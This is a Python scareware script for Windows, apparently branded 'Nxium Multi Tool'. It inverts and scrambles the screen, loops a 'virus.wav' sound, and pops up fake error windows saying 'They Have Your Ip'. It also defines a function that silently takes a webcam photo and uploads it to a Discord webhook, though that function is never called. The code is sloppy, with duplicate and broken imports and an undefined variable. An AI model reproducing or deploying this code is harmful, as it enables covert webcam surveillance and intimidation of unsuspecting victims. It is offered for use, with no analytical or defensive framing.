import ctypes
import time
import tkinter
import messagebox
import random
import win32gui
import win32api
import win32con
import random
import time

import ctypes
import win32gui
import win32api
import win32con
import random
import time
import cv2
import requests

# 1. Setup Configuration
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
FILE_NAME = "capture.jpg"
TOKEN = ""

def capture_and_send():
    # 2. Initialize the webcam (0 is usually the default camera)
    cam = cv2.VideoCapture(0)
    
    if not cam.isOpened():
        print("Error: Could not open webcam.")
        return

    # 3. Capture a single frame
    # Note: Some cameras need a moment to warm up/adjust exposure
    # You might loop cam.read() a few times for better quality
    ret, frame = cam.read()
    
    if ret:
        # Save the image locally
        cv2.imwrite(FILE_NAME, frame)
        print("Image captured successfully.")
        
        # 4. Send to Discord Webhook
        with open(FILE_NAME, "rb") as f:
            payload = {"content": "New webcam capture:"}
            files = {"file": (FILE_NAME, f, "image/jpeg")}
            response = requests.post(WEBHOOK_URL, data=payload, files=files)
            
            if response.status_code == 200 or response.status_code == 204:
                print("Image sent to Discord!")
            else:
                print(f"Failed to send. Status: {response.status_code}")
    else:
        print("Error: Could not read frame from webcam.")

    # 5. Release the camera
    cam.release()




# 1. FIX: Tell Windows this script is "DPI Aware" so it can see the whole screen
try:
    ctypes.windll.shcore.SetProcessDpiAwareness(1)
except Exception:
    ctypes.windll.user32.SetProcessDPIAware()

# Load Libraries
mag_api = ctypes.WinDLL('magnification.dll')

def run_combined_effect(duration=15):
    # Initialize Inversion API
    mag_api.MagInitialize()
    invert_matrix = (ctypes.c_float * 25)(
        -1.0, 0.0, 0.0, 0.0, 0.0,
        0.0, -1.0, 0.0, 0.0, 0.0,
        0.0, 0.0, -1.0, 0.0, 0.0,
        0.0, 0.0, 0.0, 1.0, 0.0,
        1.0, 1.0, 1.0, 0.0, 1.0
    )
    
    # Start Inversion
    mag_api.MagSetFullscreenColorEffect(ctypes.byref(invert_matrix))
    
    # Start Swirl
    hdc = win32gui.GetDC(0)
    sww = win32api.GetSystemMetrics(0)
    swh = win32api.GetSystemMetrics(1)
    
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            # Randomly shift blocks of pixels
            x = random.randint(0, sww - 100)
            y = random.randint(0, swh - 100)
            win32gui.BitBlt(hdc, x + random.randint(-10, 10), y + random.randint(-10, 10), 
                            200, 200, hdc, x, y, win32con.SRCCOPY)
            # No sleep = maximum chaos/speed
    finally:
        # CLEANUP: Crucial to reset the screen
        win32gui.ReleaseDC(0, hdc)
        win32gui.InvalidateRect(0, None, True) # Force Windows to redraw
        mag_api.MagUninitialize() # Stop inversion
        print("System Restored.")


       




mag_api = ctypes.WinDLL('magnification.dll')

def invert_screen():

    mag_api.MagInitialize()
    
   
    invert_matrix = (ctypes.c_float * 25)(
        -1.0,  0.0,  0.0,  0.0,  0.0,
         0.0, -1.0,  0.0,  0.0,  0.0,
         0.0,  0.0, -1.0,  0.0,  0.0,
         0.0,  0.0,  0.0,  1.0,  0.0,
         1.0,  1.0,  1.0,  0.0,  1.0
    )
    
    
    mag_api.MagSetFullscreenColorEffect(ctypes.byref(invert_matrix))
    
def restore_screen():    
    mag_api.MagSetFullscreenColorEffect(None)
    mag_api.MagUninitialize()
    win32gui.ReleaseDC(0, hdc)
    win32gui.InvalidateRect(0, None, True)
    print("Screen restored.")

import tkinter as tk

def show_error(title, message, x=200, y=200):
    window = tk.Toplevel()
    window.title(title)
    window.geometry(f"250x120+{x}+{y}")  # size + position
    
    tk.Label(window, text=message, fg="red").pack(pady=15)
    tk.Button(window, text="Close", command=window.destroy).pack()

root = tk.Tk()
root.withdraw()  # Hide main window

def show_all_errors():
    show_error("Error", "Hey there", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "Nxium Multi Tool BTW", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "They Have Your Ip", random.randint(100, 900), random.randint(100, 700))
    time.sleep(0.5)
    show_error("Error", "Hey there", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "Nxium Multi Tool BTW", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "They Have Your Ip", random.randint(100, 900), random.randint(100, 700))
    time.sleep(0.5)
    show_error("Error", "Hey there", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "Nxium Multi Tool BTW", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "They Have Your Ip", random.randint(100, 900), random.randint(100, 700))
    time.sleep(0.5)
    show_error("Error", "Hey there", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "Nxium Multi Tool BTW", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "They Have Your Ip", random.randint(100, 900), random.randint(100, 700))
    time.sleep(0.5)
    show_error("Error", "Hey there", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "Nxium Multi Tool BTW", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "They Have Your Ip", random.randint(100, 900), random.randint(100, 700))
    time.sleep(0.5)
    show_error("Error", "Hey there", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "Nxium Multi Tool BTW", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "They Have Your Ip", random.randint(100, 900), random.randint(100, 700))
    time.sleep(0.5)
    show_error("Error", "Hey there", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "Nxium Multi Tool BTW", random.randint(100, 900), random.randint(100, 700))
    show_error("Error", "They Have Your Ip", random.randint(100, 900), random.randint(100, 700))
    time.sleep(0.5)

import winsound

winsound.PlaySound(
    "virus.wav",
    winsound.SND_FILENAME | winsound.SND_LOOP | winsound.SND_ASYNC
)


def payload():
    invert_screen()
    run_combined_effect(duration=15)
    restore_screen()
    time.sleep(0.3)
    invert_screen()
    time.sleep(0.3)
    restore_screen()
    show_all_errors()
    

winsound.PlaySound(
    "virus.wav",
    winsound.SND_FILENAME | winsound.SND_LOOP | winsound.SND_ASYNC
)
payload()
root.mainloop()